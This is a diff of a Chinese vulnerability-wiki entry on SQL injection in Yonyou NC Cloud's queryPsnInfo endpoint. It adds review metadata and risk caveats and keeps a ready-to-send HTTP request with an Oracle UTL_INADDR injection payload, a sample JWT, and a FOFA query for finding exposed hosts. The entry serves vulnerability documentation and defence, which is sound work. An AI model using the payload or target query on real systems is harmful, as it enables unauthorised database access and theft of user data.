@@ -1,11 +1,51 @@
 ---
-
 source: "SourByte05/Vulnerability-Wiki-PoC"
+title: "用友NC Cloud queryPsnInfo staffid SQL 注入"
+product: "用友NC Cloud"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "Oracle UTL_INADDR权限和网络行为；版本未知"
+prerequisites: "固定JWT样例"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/%E7%94%A8%E5%8F%8BNC%20Cloud%20queryPsnInfo%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
+fofa: "app=\"用友-NC-Cloud\""
+id: "vw-03ea8cc8585304cc272fccaa"
+entity_id: "ve-03ea8cc8585304cc272fccaa"
+schema_version: "1"
 ---
 
-# 用友NC Cloud queryPsnInfo SQL注入漏洞
+# 用友NC Cloud queryPsnInfo staffid SQL 注入
 
-# 漏洞描述
+## 条目说明
+
+- 对象与具体问题：用友NC Cloud；queryPsnInfo staffid SQLi
+- 版本、配置及部署条件：Oracle UTL_INADDR权限和网络行为；版本未知
+- 认证与权限前提：固定JWT样例
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 未鉴权结论与提供Accesstokenncc令牌需解释
+- Oracle特定报错/解析条件；成功证据仅截图未视检
+- 在野利用无独立出处，修复版本缺失
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
+## 漏洞描述
 
 用友NC Cloud queryPsnInfo 接口处存在SQL注入漏洞，未授权的攻击者可通过此漏洞获取数据库权限，从而盗取用户数据，造成用户信息泄露。
 
@@ -13,13 +53,13 @@ source: "SourByte05/Vulnerability-Wiki-PoC"
 
 用友-NC-Cloud
 
-# **漏洞状态**
+## **漏洞状态**
 
 | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
 |------|-------|-------|------|
-| 是 | 已公开 | 已公开 | 已知 |
+| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |
 
-## 风险等级
+### 风险等级
 
 | 维度 | 评价 |
 |----|----|
@@ -28,23 +68,26 @@ source: "SourByte05/Vulnerability-Wiki-PoC"
 | 攻击者价值 | 高 |
 | 利用难度 | 低 |
 
-# 漏洞复现
+## 漏洞复现
 
 FOFA：app="用友-NC-Cloud"
 
 POC/EXP：
 
+```http
 GET /ncchr/pm/obj/queryPsnInfo?staffid=1%27+AND+1754%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%281754%3D1754%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29--+Nzkh HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
 Accesstokenncc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
 Connection: close
+```
+
 
 ![image-20240804113105110](./.resource/用友NCCloudqueryPsnInfoSQL注入漏洞/media/image-20240804113105110.png)
 
 
-# 修复方案
+## 修复方案
 
 1. 关闭互联网暴露面或接口设置访问权限
 
